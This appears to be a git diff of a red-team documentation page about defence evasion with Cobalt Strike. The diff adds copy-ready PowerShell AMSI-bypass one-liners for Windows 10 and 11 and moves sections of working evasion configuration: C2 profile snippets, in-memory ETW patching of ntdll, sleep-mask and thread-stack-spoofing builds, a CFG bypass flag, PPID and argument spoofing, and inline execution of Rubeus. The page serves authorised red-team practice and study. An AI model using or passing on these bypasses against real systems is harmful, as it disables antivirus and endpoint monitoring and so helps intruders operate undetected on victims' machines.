@@ -5,23 +5,33 @@ import { Tab, Tabs, Callout } from 'nextra-theme-docs'
     ```bash copy filename="Bash"
     peclone dump ./payload.exe
     ```
+## AMSI Bypass
+### AMSI Bypasses
+- AMSI Bypass for Windows 10
+    ```powershell copy filename="powershell"
+    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+    ```
+    
+
+- AMSI Bypass for windows 11
+    ```powershell copy filename="Powershell"
+    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
+    ```
+### Resources
+- [bypass-amsi-on-windows-11-75d231b2cac6](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6)
 ## Evasion Techniques
 ### Basic Techniques 
 <Callout type="info" emoji="👻">
-These techniques doesn't depend on the circumestances of the environment. and should be prepared and enabled before any engagement.   
+These techniques don't depend on the circumestances of the environment. and should be prepared and enabled before any engagement.   
 </Callout>
 
-#### yscalls
+#### syscalls
 Can be enabled in 3 places:
 1. artifact kit
 2. C2 profile
 3. CS client
-### Variable Techniques 
-<Callout type="info" emoji="👻">
-These techniques depend on what you'll encounter in the engagement environment of different Defense techniques, for which you'll enable and customize the bypass techniques corresponding to each.
-</Callout>
 
-### Memory Permissions & Cleanup
+#### Memory Permissions & Cleanup
 Add this snippet to c2 profile 
 ```json copy showLineNumbers filename="c2.profile"
 stage {
@@ -33,7 +43,7 @@ stage {
 }
 ```
 
-### BOF Memory Allocations
+#### BOF Memory Allocations
 Add the following snippet to c2 profile
 ```json copy filename="c2.profile" showLineNumbers
 process-inject {
@@ -48,7 +58,95 @@ process-inject {
 }
 ```
 
-### Process Injection 
+#### Tool Signatures
+Try to alter and rebuild your tools to bypass static analysis and change the tool Signature
+
+#### SMB Named Pipe Names 
+Replace default CobaltStrike pipenames for the by adding the following snippet to our c2 profile
+```json copy showLineNumbers filename="c2.profile"
+post-ex {
+        # put a list of names separated by comma, use #### for randomization
+        set pipename "totally_not_beacon, legitPipe_##";
+}
+```
+#### ETW
+
+Configure it in c2 profile
+ ```json copy filename="c2.profile" showLineNumbers /bexecute_assembly/
+    alias powerpick-patched {
+    # Also can be configuere it for execute-assembly via bexecute_assembly function
+    bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
+    }
+    ```
+#### Thread Stack Spoofing 
+We need to build our artifacts with the `thread stack spoofing` option enabled 
+![stack spoof](/images/stack-spoof-1.png)
+```bash copy filename="Bash"
+./build.sh "pipe" MapViewOfFile 296948 0 true true none /mnt/c/Tools/cobaltstrike/artifacts
+```
+Can be tested by
+```powershell copy filename="Powershell"
+ C:\Tools\Hunt-Sleeping-Beacons\Hunt-Sleeping-Beacons.exe
+```
+
+#### Sleep Mask 
+We can make the beacon obfuscate its memory while sleeping with **Sleep Mask Kit** 
+1. Build the **sleep mask kit**
+    ```bash copy filename="Bash"
+    ./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
+    ```
+2. Add the following to the **Stage** block in our c2 profile 
+    ```json copy filename="c2-profile"
+    set sleep_mask "true";
+    ```
+3. Load the **CNA** in Cobalt Strike 
+    
+#### Sleep Mask & Thread Stack Spoofing 
+Normally both are not compatible with each other, but we can solve this by:
+1. Enable evasive sleep stackspoof in `sleep.c`
+    1. Set 
+        ```cpp copy filename="sleep.c"
+        #define EVASIVE_SLEEP 1`.
+        ```
+    2. Comment out the line 
+        ```cpp copy filename="sleep.c"
+        #include "evasive_sleep.c"
+        ```
+        and uncomment the line 
+        ```cpp copy filename="sleep.c"
+        #include "evasive_sleep_stack_spoof.c"
+        ```
+2. Spoof a thread stack from the system 
+    1. Using **Process Hacker** we shuold find a process with a thread stack that starts with `NtWaitForSingleObject`, these are some processes with what  we're looking for
+        
+        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-1.png)
+    2. Using **getFunctionOffset.exe** we should get the offset of these methods from the DLL files on that target system, as an example, you can spoof the stack of **conhost.exe** by
+        ```powershell copy filename="Powershell"
+        getFunctionOffset.exe KernelBase DeviceIoControl 0x86
+        getFunctionOffset.exe kernel32 DeviceIoControl 0x81
+        getFunctionOffset.exe kernel32 BaseThreadInitThunk 0x14
+        getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
+        ```
+    3. Copy the generated code into set_callstack (replacing the example lines that were already there).
+        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-2.png)
+        <Callout type="info" emoji="👻">
+        Note that you don't need to include the call to `NtWaitForSingleObject`.    
+        </Callout>
+
+    4. Rebuild the artifact-kit and load the `cna` file into CobaltStrike
+3. Beacons injected in binaries with **CFG (Control Flow Guard)** can't be **evasive sleep** enabled. but there is a bypass to that within `evasive_sleep_stack_spoof.c` which can be easily enabled by flipping the option definition to `1`
+    ```cpp copy filename="evasive_sleep_stack_spoof.c"
+    #define CFG_BYPASS 1
+    ```
+
+
+### Runtime Techniques 
+<Callout type="info" emoji="👻">
+These techniques depend on what you'll encounter in the engagement environment of different Defense techniques, for which you'll enable and customize the bypass techniques corresponding to each.
+</Callout>
+
+
+#### Process Injection 
 <Callout type="info" emoji="👻">
 Take into consideration to inject into process's that your beacon's behaviour and network traffic can blend in with theirs     
 </Callout>
@@ -72,7 +170,7 @@ By modifying the `process_inject_spawn.c` and `process_inject_explicit.c` in `C:
     1.  Build the scripts `./build.sh /mnt/c/Tools/cobaltstrike/custom-injection`
     2.  Import the CNA aggressor profile in CobaltStrike 
 
-### PPID Spoofing
+#### PPID Spoofing
 - Using `ppid` 
 ```bash copy filename="beacon>"
 ppid 5056
@@ -152,7 +250,7 @@ int main()
 }
 ```
 
-### Command Line Argument Spoofing 
+#### Command Line Argument Spoofing 
 - Using `argue`
 ```bash copy filename="beacon>"
 argue ping -n 5 google.com
@@ -287,103 +385,26 @@ int main(int argc, char** canttrustthis)
 }
 ```
 
-### Image Load Events 
+#### Image Load Events 
 Choose binaries to `spawnto` that are likely to load the DLL files you're post-ex capabilities will load, as a reference `msiexec.exe` loads `System.Management.Automation.dll` which is loaded by `powerpick`, so we can `spawnto` it before using `powerpick`.
 ```bash copy filename="beacon>" showLineNumbers 
 spawnto x64 %windir%\sysnative\msiexec.exe
 ```
 
-### Tool Signatures
-Try to alter and rebuild your tools to bypass static analysis and change the tool Signature
 
-### SMB Named Pipe Names 
-Replace default CobaltStrike pipenames for the by adding the following snippet to our c2 profile
-```json copy showLineNumbers filename="c2.profile"
-post-ex {
-        # put a list of names separated by comma, use #### for randomization
-        set pipename "totally_not_beacon, legitPipe_##";
-}
-```
 
-### ETW
-- Bypass in session
+#### ETW
+
     Can be bypassed by patching `ntdll.dll` in memory while executing `execute-assembly` and `powerpick`
     ```powershell filename="beacon>" showLineNumbers copy
     execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
     ```
-- Configure it into c2 profile
-    ```json copy filename="c2.profile" showLineNumbers /bexecute_assembly/
-    alias powerpick-patched {
-    # Also can be configuere it for execute-assembly via bexecute_assembly function
-    bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
-    }
-    ```
+   
 
-### Inline (.NET) Execution
+#### Inline (.NET) Execution
 Execute assemblies within the beacon process without **fork & run**
 ```bash filename="beacon>" copy 
 inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
 ```
-
-### Thread Stack Spoofing 
-We need to build our artifacts with the `thread stack spoofing` option enabled 
-![stack spoof](/images/stack-spoof-1.png)
-```bash copy filename="Bash"
-./build.sh "pipe" MapViewOfFile 296948 0 true true none /mnt/c/Tools/cobaltstrike/artifacts
-```
-Can be tested by
-```powershell copy filename="Powershell"
- C:\Tools\Hunt-Sleeping-Beacons\Hunt-Sleeping-Beacons.exe
-```
-
-### Sleep Mask 
-We can make the beacon obfuscate its memory while sleeping with **Sleep Mask Kit** 
-1. Build the **sleep mask kit**
-    ```bash copy filename="Bash"
-    ./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
-    ```
-2. Add the following to the **Stage** block in our c2 profile 
-    ```json copy filename="c2-profile"
-    set sleep_mask "true";
-    ```
-3. Load the **CNA** in Cobalt Strike 
-    
-### Sleep Mask & Thread Stack Spoofing 
-Normally both are not compatible with each other, but we can solve this by:
-1. Enable evasive sleep stackspoof in `sleep.c`
-    1. Set 
-        ```cpp copy filename="sleep.c"
-        #define EVASIVE_SLEEP 1`.
-        ```
-    2. Comment out the line 
-        ```cpp copy filename="sleep.c"
-        #include "evasive_sleep.c"
-        ```
-        and uncomment the line 
-        ```cpp copy filename="sleep.c"
-        #include "evasive_sleep_stack_spoof.c"
-        ```
-2. Spoof a thread stack from the system 
-    1. Using **Process Hacker** we shuold find a process with a thread stack that starts with `NtWaitForSingleObject`, these are some processes with what  we're looking for
-        
-        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-1.png)
-    2. Using **getFunctionOffset.exe** we should get the offset of these methods from the DLL files on that target system, as an example, you can spoof the stack of **conhost.exe** by
-        ```powershell copy filename="Powershell"
-        getFunctionOffset.exe KernelBase DeviceIoControl 0x86
-        getFunctionOffset.exe kernel32 DeviceIoControl 0x81
-        getFunctionOffset.exe kernel32 BaseThreadInitThunk 0x14
-        getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
-        ```
-    3. Copy the generated code into set_callstack (replacing the example lines that were already there).
-        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-2.png)
-        <Callout type="info" emoji="👻">
-        Note that you don't need to include the call to `NtWaitForSingleObject`.    
-        </Callout>
-
-    4. Rebuild the artifact-kit and load the `cna` file into CobaltStrike
-3. Beacons injected in binaries with **CFG (Control Flow Guard)** can't be **evasive sleep** enabled. but there is a bypass to that within `evasive_sleep_stack_spoof.c` which can be easily enabled by flipping the option definition to `1`
-    ```cpp copy filename="evasive_sleep_stack_spoof.c"
-    #define CFG_BYPASS 1
-    ```
 
 
